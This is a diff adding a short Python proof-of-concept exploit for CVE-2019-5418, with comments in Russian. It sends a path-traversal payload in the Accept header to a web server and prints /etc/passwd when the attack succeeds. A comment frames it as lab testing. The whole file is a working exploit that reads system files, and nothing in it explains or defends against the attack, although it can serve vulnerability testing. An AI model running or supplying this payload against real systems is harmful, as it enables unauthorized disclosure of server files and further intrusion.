@@ -1,0 +1,25 @@
+import requests
+
+# Целевой URL (замените на реальный адрес при тестировании в лабораторных условиях)
+url = "http://example.com/"
+
+# Вредоносный заголовок Accept с обходом пути
+payload_header = "../../../../../../etc/passwd{{"
+headers = {
+    "Accept": payload_header
+}
+
+print("[*] Отправка запроса с payload для CVE-2019-5418...")
+try:
+    response = requests.get(url, headers=headers, timeout=5)
+    if response.status_code == 200:
+        # Проверяем наличие признаков успешной эксплуатации (содержимое /etc/passwd)
+        if "root:" in response.text:
+            print("[+] Уязвимость подтверждена! Начало файла /etc/passwd:")
+            print(response.text[:200])  # Выводим первые 200 символов
+        else:
+            print("[?] Сервер ответил кодом 200, но целевой файл не обнаружен. Возможно, уязвимость отсутствует.")
+    else:
+        print("[-] Уязвимость не подтверждена. Код ответа:", response.status_code)
+except requests.exceptions.RequestException as e:
+    print("[-] Ошибка при выполнении запроса:", e)
